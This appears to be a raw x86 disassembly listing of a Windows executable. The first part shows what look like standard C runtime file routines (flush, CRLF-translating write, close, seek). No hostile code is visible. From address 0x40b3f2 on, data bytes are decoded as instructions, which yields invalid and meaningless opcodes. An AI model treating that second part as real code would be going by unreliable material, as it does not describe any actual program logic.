  406000:	cmp    eax,edi
  406002:	jne    0x406013
  406004:	mov    eax,DWORD PTR [esi+0xc]
  406007:	test   al,al
  406009:	jns    0x40601a
  40600b:	and    eax,0xfffffffd
  40600e:	mov    DWORD PTR [esi+0xc],eax
  406011:	jmp    0x40601a
  406013:	or     DWORD PTR [esi+0xc],0x20
  406017:	or     ebx,0xffffffff
  40601a:	pop    edi
  40601b:	mov    eax,DWORD PTR [esi+0x8]
  40601e:	and    DWORD PTR [esi+0x4],0x0
  406022:	mov    DWORD PTR [esi],eax
  406024:	pop    esi
  406025:	mov    eax,ebx
  406027:	pop    ebx
  406028:	ret    
  406029:	push   esi
  40602a:	mov    esi,DWORD PTR [esp+0x8]
  40602e:	test   esi,esi
  406030:	jne    0x40603b
  406032:	push   esi
  406033:	call   0x406064
  406038:	pop    ecx
  406039:	pop    esi
  40603a:	ret    
  40603b:	push   esi
  40603c:	call   0x405fcc
  406041:	test   eax,eax
  406043:	pop    ecx
  406044:	je     0x40604b
  406046:	or     eax,0xffffffff
  406049:	pop    esi
  40604a:	ret    
  40604b:	test   BYTE PTR [esi+0xd],0x40
  40604f:	je     0x406060
  406051:	push   DWORD PTR [esi+0x10]
  406054:	call   0x406374
  406059:	pop    ecx
  40605a:	neg    eax
  40605c:	sbb    eax,eax
  40605e:	pop    esi
  40605f:	ret    
  406060:	xor    eax,eax
  406062:	pop    esi
  406063:	ret    
  406064:	push   ebx
  406065:	push   esi
  406066:	push   edi
  406067:	xor    esi,esi
  406069:	xor    ebx,ebx
  40606b:	xor    edi,edi
  40606d:	cmp    DWORD PTR ds:0x4299a0,esi
  406073:	jle    0x4060c2
  406075:	mov    eax,ds:0x428984
  40607a:	mov    eax,DWORD PTR [eax+esi*4]
  40607d:	test   eax,eax
  40607f:	je     0x4060b9
  406081:	mov    ecx,DWORD PTR [eax+0xc]
  406084:	test   cl,0x83
  406087:	je     0x4060b9
  406089:	cmp    DWORD PTR [esp+0x10],0x1
  40608e:	jne    0x40609f
  406090:	push   eax
  406091:	call   0x406029
  406096:	cmp    eax,0xffffffff
  406099:	pop    ecx
  40609a:	je     0x4060b9
  40609c:	inc    ebx
  40609d:	jmp    0x4060b9
  40609f:	cmp    DWORD PTR [esp+0x10],0x0
  4060a4:	jne    0x4060b9
  4060a6:	test   cl,0x2
  4060a9:	je     0x4060b9
  4060ab:	push   eax
  4060ac:	call   0x406029
  4060b1:	cmp    eax,0xffffffff
  4060b4:	pop    ecx
  4060b5:	jne    0x4060b9
  4060b7:	or     edi,eax
  4060b9:	inc    esi
  4060ba:	cmp    esi,DWORD PTR ds:0x4299a0
  4060c0:	jl     0x406075
  4060c2:	cmp    DWORD PTR [esp+0x10],0x1
  4060c7:	mov    eax,ebx
  4060c9:	je     0x4060cd
  4060cb:	mov    eax,edi
  4060cd:	pop    edi
  4060ce:	pop    esi
  4060cf:	pop    ebx
  4060d0:	ret    
  4060d1:	push   0x1
  4060d3:	call   0x406064
  4060d8:	pop    ecx
  4060d9:	ret    
  4060da:	push   ebp
  4060db:	mov    ebp,esp
  4060dd:	push   ecx
  4060de:	mov    ecx,DWORD PTR [ebp+0x8]
  4060e1:	cmp    ecx,0xff
  4060e7:	jbe    0x406147
  4060e9:	and    WORD PTR [ebp-0x4],0x0
  4060ee:	push   edi
  4060ef:	xor    eax,eax
  4060f1:	lea    edi,[ebp-0x2]
  4060f4:	stos   WORD PTR es:[edi],ax
  4060f6:	mov    eax,ecx
  4060f8:	shr    eax,0x8
  4060fb:	cmp    DWORD PTR ds:0x4299c4,0x0
  406102:	mov    BYTE PTR [ebp+0xa],al
  406105:	mov    BYTE PTR [ebp+0xb],cl
  406108:	pop    edi
  406109:	jne    0x40610f
  40610b:	xor    eax,eax
  40610d:	leave  
  40610e:	ret    
  40610f:	push   0x1
  406111:	push   DWORD PTR ds:0x4299c0
  406117:	lea    eax,[ebp-0x4]
  40611a:	push   DWORD PTR ds:0x429ae4
  406120:	push   eax
  406121:	push   0x2
  406123:	lea    eax,[ebp+0xa]
  406126:	push   eax
  406127:	push   0x1
  406129:	call   0x404b04
  40612e:	add    esp,0x1c
  406131:	test   eax,eax
  406133:	je     0x40610b
  406135:	cmp    WORD PTR [ebp-0x2],0x0
  40613a:	jne    0x40610b
  40613c:	test   BYTE PTR [ebp-0x4],0x8
  406140:	je     0x40610b
  406142:	xor    eax,eax
  406144:	inc    eax
  406145:	leave  
  406146:	ret    
  406147:	cmp    DWORD PTR ds:0x428278,0x1
  40614e:	jle    0x40615c
  406150:	push   0x8
  406152:	push   ecx
  406153:	call   0x40312d
  406158:	pop    ecx
  406159:	pop    ecx
  40615a:	leave  
  40615b:	ret    
  40615c:	mov    eax,ds:0x428270
  406161:	movzx  eax,BYTE PTR [eax+ecx*2]
  406165:	and    eax,0x8
  406168:	leave  
  406169:	ret    
  40616a:	push   esi
  40616b:	mov    esi,DWORD PTR [esp+0x8]
  40616f:	mov    eax,DWORD PTR [esi+0xc]
  406172:	push   edi
  406173:	or     edi,0xffffffff
  406176:	test   al,0x40
  406178:	je     0x40617f
  40617a:	or     eax,0xffffffff
  40617d:	jmp    0x4061b9
  40617f:	test   al,0x83
  406181:	je     0x4061b7
  406183:	push   esi
  406184:	call   0x405fcc
  406189:	push   esi
  40618a:	mov    edi,eax
  40618c:	call   0x40647e
  406191:	push   DWORD PTR [esi+0x10]
  406194:	call   0x4063cb
  406199:	add    esp,0xc
  40619c:	test   eax,eax
  40619e:	jge    0x4061a5
  4061a0:	or     edi,0xffffffff
  4061a3:	jmp    0x4061b7
  4061a5:	mov    eax,DWORD PTR [esi+0x1c]
  4061a8:	test   eax,eax
  4061aa:	je     0x4061b7
  4061ac:	push   eax
  4061ad:	call   0x40331e
  4061b2:	and    DWORD PTR [esi+0x1c],0x0
  4061b6:	pop    ecx
  4061b7:	mov    eax,edi
  4061b9:	and    DWORD PTR [esi+0xc],0x0
  4061bd:	pop    edi
  4061be:	pop    esi
  4061bf:	ret    
  4061c0:	push   ebp
  4061c1:	mov    ebp,esp
  4061c3:	sub    esp,0x41c
  4061c9:	mov    eax,ds:0x4282a8
  4061ce:	xor    eax,DWORD PTR [ebp+0x4]
  4061d1:	mov    ecx,DWORD PTR [ebp+0x8]
  4061d4:	cmp    ecx,DWORD PTR ds:0x429c08
  4061da:	push   ebx
  4061db:	push   esi
  4061dc:	mov    DWORD PTR [ebp-0x4],eax
  4061df:	push   edi
  4061e0:	jae    0x406350
  4061e6:	mov    eax,ecx
  4061e8:	sar    eax,0x5
  4061eb:	lea    ebx,[eax*4+0x429c20]
  4061f2:	mov    eax,DWORD PTR [ebx]
  4061f4:	mov    esi,ecx
  4061f6:	and    esi,0x1f
  4061f9:	shl    esi,0x3
  4061fc:	mov    al,BYTE PTR [eax+esi*1+0x4]
  406200:	test   al,0x1
  406202:	mov    DWORD PTR [ebp-0x18],ebx
  406205:	je     0x406350
  40620b:	xor    edi,edi
  40620d:	cmp    DWORD PTR [ebp+0x10],edi
  406210:	mov    DWORD PTR [ebp-0xc],edi
  406213:	mov    DWORD PTR [ebp-0x14],edi
  406216:	jne    0x40621f
  406218:	xor    eax,eax
  40621a:	jmp    0x406364
  40621f:	test   al,0x20
  406221:	je     0x406230
  406223:	push   0x2
  406225:	push   edi
  406226:	push   edi
  406227:	push   ecx
  406228:	call   0x4064a9
  40622d:	add    esp,0x10
  406230:	mov    eax,DWORD PTR [ebx]
  406232:	add    eax,esi
  406234:	test   BYTE PTR [eax+0x4],0x80
  406238:	je     0x4062ec
  40623e:	cmp    DWORD PTR [ebp+0x10],edi
  406241:	mov    eax,DWORD PTR [ebp+0xc]
  406244:	mov    DWORD PTR [ebp-0x8],eax
  406247:	mov    DWORD PTR [ebp+0x8],edi
  40624a:	jbe    0x406324
  406250:	mov    ecx,DWORD PTR [ebp-0x8]
  406253:	sub    ecx,DWORD PTR [ebp+0xc]
  406256:	lea    eax,[ebp-0x41c]
  40625c:	cmp    ecx,DWORD PTR [ebp+0x10]
  40625f:	jae    0x406286
  406261:	mov    edx,DWORD PTR [ebp-0x8]
  406264:	inc    DWORD PTR [ebp-0x8]
  406267:	mov    dl,BYTE PTR [edx]
  406269:	inc    ecx
  40626a:	cmp    dl,0xa
  40626d:	jne    0x406277
  40626f:	inc    DWORD PTR [ebp-0x14]
  406272:	mov    BYTE PTR [eax],0xd
  406275:	inc    eax
  406276:	inc    edi
  406277:	mov    ebx,DWORD PTR [ebp-0x18]
  40627a:	mov    BYTE PTR [eax],dl
  40627c:	inc    eax
  40627d:	inc    edi
  40627e:	cmp    edi,0x400
  406284:	jl     0x40625c
  406286:	mov    edi,eax
  406288:	lea    eax,[ebp-0x41c]
  40628e:	sub    edi,eax
  406290:	push   0x0
  406292:	lea    eax,[ebp-0x10]
  406295:	push   eax
  406296:	push   edi
  406297:	lea    eax,[ebp-0x41c]
  40629d:	push   eax
  40629e:	mov    eax,DWORD PTR [ebx]
  4062a0:	push   DWORD PTR [eax+esi*1]
  4062a3:	call   DWORD PTR ds:0x426064
  4062a9:	test   eax,eax
  4062ab:	je     0x4062c6
  4062ad:	mov    eax,DWORD PTR [ebp-0x10]
  4062b0:	add    DWORD PTR [ebp-0xc],eax
  4062b3:	cmp    eax,edi
  4062b5:	jl     0x4062cf
  4062b7:	mov    eax,DWORD PTR [ebp-0x8]
  4062ba:	sub    eax,DWORD PTR [ebp+0xc]
  4062bd:	xor    edi,edi
  4062bf:	cmp    eax,DWORD PTR [ebp+0x10]
  4062c2:	jb     0x406250
  4062c4:	jmp    0x4062d1
  4062c6:	call   DWORD PTR ds:0x426018
  4062cc:	mov    DWORD PTR [ebp+0x8],eax
  4062cf:	xor    edi,edi
  4062d1:	mov    eax,DWORD PTR [ebp-0xc]
  4062d4:	cmp    eax,edi
  4062d6:	jne    0x40634b
  4062d8:	cmp    DWORD PTR [ebp+0x8],edi
  4062db:	je     0x406324
  4062dd:	push   0x5
  4062df:	pop    eax
  4062e0:	cmp    DWORD PTR [ebp+0x8],eax
  4062e3:	jne    0x406319
  4062e5:	mov    ds:0x4287d0,eax
  4062ea:	jmp    0x406357
  4062ec:	push   edi
  4062ed:	lea    ecx,[ebp-0x10]
  4062f0:	push   ecx
  4062f1:	push   DWORD PTR [ebp+0x10]
  4062f4:	push   DWORD PTR [ebp+0xc]
  4062f7:	push   DWORD PTR [eax]
  4062f9:	call   DWORD PTR ds:0x426064
  4062ff:	test   eax,eax
  406301:	je     0x40630e
  406303:	mov    eax,DWORD PTR [ebp-0x10]
  406306:	mov    DWORD PTR [ebp+0x8],edi
  406309:	mov    DWORD PTR [ebp-0xc],eax
  40630c:	jmp    0x4062d1
  40630e:	call   DWORD PTR ds:0x426018
  406314:	mov    DWORD PTR [ebp+0x8],eax
  406317:	jmp    0x4062d1
  406319:	push   DWORD PTR [ebp+0x8]
  40631c:	call   0x405d4d
  406321:	pop    ecx
  406322:	jmp    0x406361
  406324:	mov    eax,DWORD PTR [ebx]
  406326:	test   BYTE PTR [eax+esi*1+0x4],0x40
  40632b:	je     0x406339
  40632d:	mov    eax,DWORD PTR [ebp+0xc]
  406330:	cmp    BYTE PTR [eax],0x1a
  406333:	je     0x406218
  406339:	mov    DWORD PTR ds:0x4287cc,0x1c
  406343:	mov    DWORD PTR ds:0x4287d0,edi
  406349:	jmp    0x406361
  40634b:	sub    eax,DWORD PTR [ebp-0x14]
  40634e:	jmp    0x406364
  406350:	and    DWORD PTR ds:0x4287d0,0x0
  406357:	mov    DWORD PTR ds:0x4287cc,0x9
  406361:	or     eax,0xffffffff
  406364:	mov    ecx,DWORD PTR [ebp-0x4]
  406367:	xor    ecx,DWORD PTR [ebp+0x4]
  40636a:	pop    edi
  40636b:	pop    esi
  40636c:	pop    ebx
  40636d:	call   0x403606
  406372:	leave  
  406373:	ret    
  406374:	mov    eax,DWORD PTR [esp+0x4]
  406378:	cmp    eax,DWORD PTR ds:0x429c08
  40637e:	jae    0x4063bd
  406380:	mov    ecx,eax
  406382:	sar    ecx,0x5
  406385:	mov    ecx,DWORD PTR [ecx*4+0x429c20]
  40638c:	mov    edx,eax
  40638e:	and    edx,0x1f
  406391:	test   BYTE PTR [ecx+edx*8+0x4],0x1
  406396:	je     0x4063bd
  406398:	push   eax
  406399:	call   0x405f38
  40639e:	pop    ecx
  40639f:	push   eax
  4063a0:	call   DWORD PTR ds:0x426030
  4063a6:	test   eax,eax
  4063a8:	jne    0x4063b2
  4063aa:	call   DWORD PTR ds:0x426018
  4063b0:	jmp    0x4063b4
  4063b2:	xor    eax,eax
  4063b4:	test   eax,eax
  4063b6:	je     0x4063ca
  4063b8:	mov    ds:0x4287d0,eax
  4063bd:	mov    DWORD PTR ds:0x4287cc,0x9
  4063c7:	or     eax,0xffffffff
  4063ca:	ret    
  4063cb:	push   ebx
  4063cc:	push   ebp
  4063cd:	push   esi
  4063ce:	push   edi
  4063cf:	mov    edi,DWORD PTR [esp+0x14]
  4063d3:	cmp    edi,DWORD PTR ds:0x429c08
  4063d9:	jae    0x406465
  4063df:	mov    eax,edi
  4063e1:	sar    eax,0x5
  4063e4:	mov    esi,edi
  4063e6:	and    esi,0x1f
  4063e9:	lea    ebx,[eax*4+0x429c20]
  4063f0:	mov    eax,DWORD PTR [ebx]
  4063f2:	shl    esi,0x3
  4063f5:	test   BYTE PTR [eax+esi*1+0x4],0x1
  4063fa:	je     0x406465
  4063fc:	push   edi
  4063fd:	call   0x405f38
  406402:	cmp    eax,0xffffffff
  406405:	pop    ecx
  406406:	je     0x406444
  406408:	cmp    edi,0x1
  40640b:	je     0x406412
  40640d:	cmp    edi,0x2
  406410:	jne    0x406428
  406412:	push   0x2
  406414:	call   0x405f38
  406419:	push   0x1
  40641b:	mov    ebp,eax
  40641d:	call   0x405f38
  406422:	cmp    eax,ebp
  406424:	pop    ecx
  406425:	pop    ecx
  406426:	je     0x406444
  406428:	push   edi
  406429:	call   0x405f38
  40642e:	pop    ecx
  40642f:	push   eax
  406430:	call   DWORD PTR ds:0x4260e0
  406436:	test   eax,eax
  406438:	jne    0x406444
  40643a:	call   DWORD PTR ds:0x426018
  406440:	mov    ebp,eax
  406442:	jmp    0x406446
  406444:	xor    ebp,ebp
  406446:	push   edi
  406447:	call   0x405ebe
  40644c:	mov    eax,DWORD PTR [ebx]
  40644e:	and    BYTE PTR [eax+esi*1+0x4],0x0
  406453:	test   ebp,ebp
  406455:	pop    ecx
  406456:	je     0x406461
  406458:	push   ebp
  406459:	call   0x405d4d
  40645e:	pop    ecx
  40645f:	jmp    0x406476
  406461:	xor    eax,eax
  406463:	jmp    0x406479
  406465:	and    DWORD PTR ds:0x4287d0,0x0
  40646c:	mov    DWORD PTR ds:0x4287cc,0x9
  406476:	or     eax,0xffffffff
  406479:	pop    edi
  40647a:	pop    esi
  40647b:	pop    ebp
  40647c:	pop    ebx
  40647d:	ret    
  40647e:	push   esi
  40647f:	mov    esi,DWORD PTR [esp+0x8]
  406483:	mov    eax,DWORD PTR [esi+0xc]
  406486:	test   al,0x83
  406488:	je     0x4064a7
  40648a:	test   al,0x8
  40648c:	je     0x4064a7
  40648e:	push   DWORD PTR [esi+0x8]
  406491:	call   0x40331e
  406496:	and    WORD PTR [esi+0xc],0xfbf7
  40649c:	xor    eax,eax
  40649e:	pop    ecx
  40649f:	mov    DWORD PTR [esi],eax
  4064a1:	mov    DWORD PTR [esi+0x8],eax
  4064a4:	mov    DWORD PTR [esi+0x4],eax
  4064a7:	pop    esi
  4064a8:	ret    
  4064a9:	push   ebp
  4064aa:	mov    ebp,esp
  4064ac:	push   ecx
  4064ad:	push   ecx
  4064ae:	mov    eax,DWORD PTR [ebp+0x8]
  4064b1:	cmp    eax,DWORD PTR ds:0x429c08
  4064b7:	push   esi
  4064b8:	push   edi
  4064b9:	jae    0x40652d
  4064bb:	mov    ecx,eax
  4064bd:	sar    ecx,0x5
  4064c0:	mov    esi,eax
  4064c2:	and    esi,0x1f
  4064c5:	lea    edi,[ecx*4+0x429c20]
  4064cc:	mov    ecx,DWORD PTR [edi]
  4064ce:	shl    esi,0x3
  4064d1:	test   BYTE PTR [ecx+esi*1+0x4],0x1
  4064d6:	je     0x40652d
  4064d8:	mov    ecx,DWORD PTR [ebp+0xc]
  4064db:	mov    DWORD PTR [ebp-0x8],ecx
  4064de:	mov    ecx,DWORD PTR [ebp+0x10]
  4064e1:	push   eax
  4064e2:	mov    DWORD PTR [ebp-0x4],ecx
  4064e5:	call   0x405f38
  4064ea:	cmp    eax,0xffffffff
  4064ed:	pop    ecx
  4064ee:	je     0x406534
  4064f0:	push   DWORD PTR [ebp+0x14]
  4064f3:	lea    ecx,[ebp-0x4]
  4064f6:	push   ecx
  4064f7:	push   DWORD PTR [ebp-0x8]
  4064fa:	push   eax
  4064fb:	call   DWORD PTR ds:0x426038
  406501:	cmp    eax,0xffffffff
  406504:	mov    DWORD PTR [ebp-0x8],eax
  406507:	jne    0x40651c
  406509:	call   DWORD PTR ds:0x426018
  40650f:	test   eax,eax
  406511:	je     0x40651c
  406513:	push   eax
  406514:	call   0x405d4d
  406519:	pop    ecx
  40651a:	jmp    0x40653e
  40651c:	mov    eax,DWORD PTR [edi]
  40651e:	lea    eax,[eax+esi*1+0x4]
  406522:	and    BYTE PTR [eax],0xfd
  406525:	mov    eax,DWORD PTR [ebp-0x8]
  406528:	mov    edx,DWORD PTR [ebp-0x4]
  40652b:	jmp    0x406544
  40652d:	and    DWORD PTR ds:0x4287d0,0x0
  406534:	mov    DWORD PTR ds:0x4287cc,0x9
  40653e:	or     eax,0xffffffff
  406541:	or     edx,0xffffffff
  406544:	pop    edi
  406545:	pop    esi
  406546:	leave  
  406547:	ret    
  406548:	jmp    DWORD PTR ds:0x426040
  40654e:	int3   
  40654f:	int3   
  406550:	inc    DWORD PTR [eax]
	...
  40b3f2:	add    BYTE PTR [eax],al
  40b3f4:	sbb    DWORD PTR [eax],esp
  40b3f6:	or     al,0x9
  40b3f8:	pop    ds
  40b3f9:	popa   
  40b3fa:	adc    ebp,DWORD PTR [ecx+0x1ec90300]
	...
  40b870:	add    BYTE PTR [eax],al
  40b872:	dec    ebp
  40b873:	pop    edx
  40b874:	mov    WORD PTR [eax],es
  40b876:	pop    es
  40b877:	add    al,0xf8
  40b879:	add    al,0xc
  40b87b:	or     ah,dh
  40b87d:	or     bl,dh
  40b87f:	or     eax,0x10a80cf0
  40b884:	in     al,dx
  40b885:	adc    BYTE PTR [esp+edx*1],dl
  40b888:	call   0xe45910a1
  40b88d:	sbb    BYTE PTR [esp+ebx*1],bl
  40b890:	loopne 0x40b8ae
  40b892:	and    BYTE PTR [eax],ah
  40b894:	fsub   QWORD PTR [eax]
  40b896:	and    al,0x24
  40b898:	fsub   DWORD PTR [eax+ebp*1]
  40b89b:	sub    ah,dl
  40b89d:	sub    BYTE PTR [esp+ebp*1],ch
  40b8a0:	shr    BYTE PTR [eax+esi*1],1
  40b8a3:	xor    ah,cl
  40b8a5:	xor    BYTE PTR [esp+esi*1],dh
  40b8a8:	enter  0x3834,0x38
  40b8ac:	les    edi,FWORD PTR [eax]
  40b8ae:	xor    al,0x3f
  40b8b0:	sar    BYTE PTR [esi+ecx*2],0x61
  40b8b4:	cli    
  40b8b5:	push   edx
  40b8b6:	inc    esp
  40b8b7:	lock inc ecx
  40b8b9:	xchg   edi,eax
  40b8ba:	imul   esi,eax,0x6f8104b5
  40b8c0:	sbb    al,0x24
  40b8c2:	cmp    DWORD PTR ds:0x2526204c,esp
  40b8c8:	xor    esp,DWORD PTR [edx]
  40b8ca:	cmp    DWORD PTR [edi],esi
  40b8cc:	inc    esp
  40b8cd:	cmp    eax,0x2d32323d
  40b8d2:	adc    al,0x40
  40b8d4:	add    cl,BYTE PTR [ebx]
  40b8d6:	inc    esp
  40b8d7:	push   ss
  40b8d8:	adc    eax,0x6034816
  40b8dd:	dec    eax
  40b8de:	sub    BYTE PTR ds:0x11d4c3f,bh
  40b8e4:	adc    BYTE PTR [ebx],bl
  40b8e6:	pop    edx
  40b8e7:	jnp    0x40b966
  40b8e9:	jp     0x40b947
  40b8eb:	js     0x40b871
  40b8ed:	js     0x40b96b
  40b8ef:	jl     0x40b871
  40b8f1:	jl     0x40b893
  40b8f3:	mov    gs,ebx
  40b8f5:	test   eax,0xf085f5e0
  40b8fa:	in     al,dx
  40b8fb:	stc    
  40b8fc:	mov    esp,edi
  40b8fe:	call   0xf5394700
  40b903:	loope  0x40b896
  40b905:	in     al,0xf2
  40b907:	in     eax,0x95
  40b909:	loopne 0x40b900
  40b90b:	adc    DWORD PTR [esp+ebp*8],0xe89dedf9
  40b912:	xor    eax,0xf0d46a0b
  40b917:	aad    0xa5
  40b919:	sar    BYTE PTR ds:0xdbdc6c03,1
  40b91f:	(bad)  [ebp+0x7b1b25d8]
  40b925:	les    edi,FWORD PTR [edi-0x2a3f4a3b]
  40b92b:	mov    eax,ds:0xcdd0cc3e
  40b930:	mov    ebp,0x56d9adc8
  40b935:	mov    ah,0xb5
  40b937:	mov    ch,0xc5
  40b939:	mov    al,0xac
  40b93b:	mov    ecx,0xbd7dbcc8
  40b940:	int    0xb8
  40b942:	rcl    BYTE PTR [ebx+0x6],cl
  40b945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b946:	nop
  40b947:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b948:	aad    0xa0
  40b94a:	ficomp DWORD PTR [ebx+0x10]
  40b94d:	lods   al,BYTE PTR ds:[esi]
  40b94e:	mov    ecx,0xe2a8ddad
  40b953:	arpl   WORD PTR ds:0xe5958194,sp
  40b959:	nop
  40b95a:	mov    edx,0x88808b83
  40b95f:	popf   
  40b960:	in     eax,dx
  40b961:	cwde   
  40b962:	lock lock or al,0xf0
  40b966:	hlt    
  40b967:	hlt    
  40b968:	or     ah,dh
  40b96a:	clc    
  40b96b:	clc    
  40b96c:	add    al,0xf8
  40b96e:	cld    
  40b96f:	cld    
  40b970:	add    ah,bh
  40b972:	add    BYTE PTR [eax],al
  40b974:	cld    
  40b975:	add    BYTE PTR [esp+eax*1],al
  40b978:	clc    
  40b979:	add    al,0x58
  40b97b:	dec    edi
  40b97c:	hlt    
  40b97d:	or     BYTE PTR [eax+0xf],al
  40b980:	(bad)  
  40b982:	adc    DWORD PTR [edx+0x14144510],ebp
  40b988:	call   0xe458d1a1
  40b98d:	sbb    ah,bh
  40b98f:	sbb    al,0x1e
  40b991:	sbb    ebp,DWORD PTR [ebx]
  40b993:	and    ebp,DWORD PTR [ebx]
  40b995:	and    BYTE PTR [esp+edx*1],ah
  40b998:	es and al,0x28
  40b99b:	enter  0x28d4,0x2c
  40b99f:	sub    al,0xd0
  40b9a1:	sub    al,0x76
  40b9a3:	sbb    ecx,ebp
  40b9a5:	xor    BYTE PTR [esp],dh
  40b9a8:	enter  0x3834,0x78
  40b9ac:	cmp    bh,BYTE PTR [eax]
  40b9ae:	cmp    al,0x3c
  40b9b0:	add    BYTE PTR [eax+eax*2],bh
  40b9b3:	push   eax
  40b9b4:	mov    esp,0xb8464440
  40b9b9:	inc    esp
  40b9ba:	dec    ebp
  40b9bb:	dec    eax
  40b9bc:	mov    ch,0x48
  40b9be:	dec    esp
  40b9bf:	dec    esp
  40b9c0:	mov    al,0x4c
  40b9c2:	push   ebp
  40b9c3:	push   eax
  40b9c4:	lods   eax,DWORD PTR ds:[esi]
  40b9c5:	push   eax
  40b9c6:	push   esp
  40b9c7:	push   esp
  40b9c8:	test   al,0x54
  40b9ca:	pop    eax
  40b9cb:	sub    BYTE PTR [ebx+0x58],bl
  40b9ce:	pop    esp
  40b9cf:	pop    eax
  40b9d0:	mov    al,ds:0x9dbb265c
  40b9d5:	pusha  
  40b9d6:	fs pop ax
  40b9d9:	jecxz  0x40ba43
  40b9db:	push   0x7c6c6864
  40b9e0:	nop
  40b9e1:	ins    BYTE PTR es:[edi],dx
  40b9e2:	jo     0x40ba54
  40b9e4:	jl     0x40ba56
  40b9e6:	je     0x40ba4c
  40b9e8:	mov    BYTE PTR [eax+edi*2+0x78],dh
  40b9ec:	test   BYTE PTR [eax+0x6c],bh
  40b9ef:	jl     0x40b971
  40b9f1:	jl     0x40b973
  40b9f3:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  40b9f8:	js     0x40b97e
  40b9fa:	pop    esp
  40b9fb:	(bad)  
  40b9fc:	mov    ecx,DWORD PTR [eax-0x738f713d]
  40ba02:	nop
  40ba03:	mov    al,ds:0x8bfc9093
  40ba08:	push   0x64989894
  40ba0d:	cwde   
  40ba0e:	pushf  
  40ba0f:	pushf  
  40ba10:	pusha  
  40ba11:	pushf  
  40ba12:	mov    al,ds:0xa4a05ca0
  40ba17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba18:	pop    eax
  40ba19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba1a:	test   al,0xc8
  40ba1c:	stos   DWORD PTR es:[edi],eax
  40ba1d:	test   al,0xb4
  40ba1f:	lods   al,BYTE PTR ds:[esi]
  40ba20:	push   eax
  40ba21:	lods   al,BYTE PTR ds:[esi]
  40ba22:	mov    al,0xb0
  40ba24:	dec    esp
  40ba25:	mov    al,0xb4
  40ba27:	mov    ah,0x48
  40ba29:	mov    ah,0xb8
  40ba2b:	mov    eax,0xbcbcb844
  40ba30:	inc    eax
  40ba31:	mov    esp,0xc03cc0c0
  40ba36:	(bad)  
  40ba37:	les    edi,FWORD PTR [eax]
  40ba39:	(bad)  
  40ba3a:	enter  0x34c8,0xc8
  40ba3e:	int3   
  40ba3f:	int3   
  40ba40:	xor    ah,cl
  40ba42:	rcl    al,1
  40ba44:	sub    al,0xd0
  40ba46:	aam    0xd4
  40ba48:	sub    ah,dl
  40ba4a:	fcomp  st(0)
  40ba4c:	and    al,0xd8
  40ba4e:	(bad)  
  40ba50:	and    ah,bl
  40ba52:	loopne 0x40ba34
  40ba54:	sbb    al,0xe0
  40ba56:	in     al,0xe4
  40ba58:	sbb    ah,ah
  40ba5a:	call   0xed28cf47
  40ba5f:	in     al,dx
  40ba60:	adc    ah,ch
  40ba62:	lock lock or al,0xf0
  40ba66:	hlt    
  40ba67:	hlt    
  40ba68:	or     ah,dh
  40ba6a:	clc    
  40ba6b:	clc    
  40ba6c:	add    al,0xf8
  40ba6e:	cld    
  40ba6f:	cld    
  40ba70:	add    ah,bh
  40ba72:	cs je  0x40bad6
  40ba75:	js     0x40bae7
  40ba77:	add    al,0xf8
  40ba79:	add    al,0x8
  40ba7b:	sub    BYTE PTR [ebx],cl
  40ba7d:	or     BYTE PTR [esp+ebx*1],cl
  40ba80:	lock or al,0x10
  40ba83:	or     al,0xed
  40ba85:	adc    BYTE PTR [eax+edx*1],dl
  40ba88:	call   0x5ba002a1
  40ba8d:	cs inc edx
  40ba8f:	dec    ebp
  40ba90:	loopne 0x40baae
  40ba92:	and    BYTE PTR [eax],ah
  40ba94:	fsub   QWORD PTR [eax]
  40ba96:	inc    esp
  40ba97:	and    al,0xd8
  40ba99:	les    eax,FWORD PTR [esi]
  40ba9b:	pop    edx
  40ba9c:	pop    ebx
  40ba9d:	pop    esi
  40ba9e:	dec    edi
  40ba9f:	sub    al,0xd0
  40baa1:	sub    al,0x30
  40baa3:	add    ah,cl
  40baa5:	xor    BYTE PTR [esp+eax*1],dh
  40baa8:	aaa    
  40baa9:	xor    al,0x38
  40baab:	push   ss
  40baac:	les    edi,FWORD PTR [eax]
  40baae:	cmp    al,0x1c
  40bab0:	sar    DWORD PTR [eax+eax*2],0x40
  40bab4:	mov    esp,0xb8444440
  40bab9:	inc    esp
  40baba:	dec    eax
  40babb:	dec    eax
  40babc:	mov    ah,0x48
  40babe:	ins    BYTE PTR es:[edi],dx
  40babf:	dec    esp
  40bac0:	mov    al,0xac
  40bac2:	jle    0x40bae6
  40bac4:	xor    DWORD PTR [ebx+edi*1],edi
  40bac7:	xor    DWORD PTR [eax-0x5ba5a7ac],ebp
  40bacd:	pop    eax
  40bace:	pop    esp
  40bacf:	cmp    al,0x5f
  40bad1:	pop    esp
  40bad2:	pusha  
  40bad3:	bound  ebx,QWORD PTR [eax+eiz*2+0x64992a64]
  40bada:	push   0x6c689468
  40badf:	ins    BYTE PTR es:[edi],dx
  40bae0:	nop
  40bae1:	ins    BYTE PTR es:[edi],dx
  40bae2:	jo     0x40bb54
  40bae4:	mov    WORD PTR [eax+0x34],?
  40bae7:	je     0x40ba71
  40bae9:	mov    ah,0x78
  40baeb:	js     0x40ba71
  40baed:	js     0x40bb6b
  40baef:	jl     0x40ba71
  40baf1:	jl     0x40ba73
  40baf3:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  40baf8:	js     0x40ba7e
  40bafa:	mov    BYTE PTR [eax-0x7373778c],cl
  40bb00:	jo     0x40ba8e
  40bb02:	nop
  40bb03:	nop
  40bb04:	ins    BYTE PTR es:[edi],dx
  40bb05:	nop
  40bb06:	xchg   esp,eax
  40bb07:	xchg   esp,eax
  40bb08:	push   0x64989894
  40bb0d:	cwde   
  40bb0e:	pushf  
  40bb0f:	pushf  
  40bb10:	pusha  
  40bb11:	pushf  
  40bb12:	mov    al,ds:0xa4a05ca0
  40bb17:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb18:	pop    eax
  40bb19:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bb1a:	test   al,0xa8
  40bb1c:	push   esp
  40bb1d:	test   al,0xac
  40bb1f:	lods   al,BYTE PTR ds:[esi]
  40bb20:	push   eax
  40bb21:	lods   al,BYTE PTR ds:[esi]
  40bb22:	mov    al,0xb0
  40bb24:	dec    esp
  40bb25:	mov    al,0xb4
  40bb27:	mov    ah,0x48
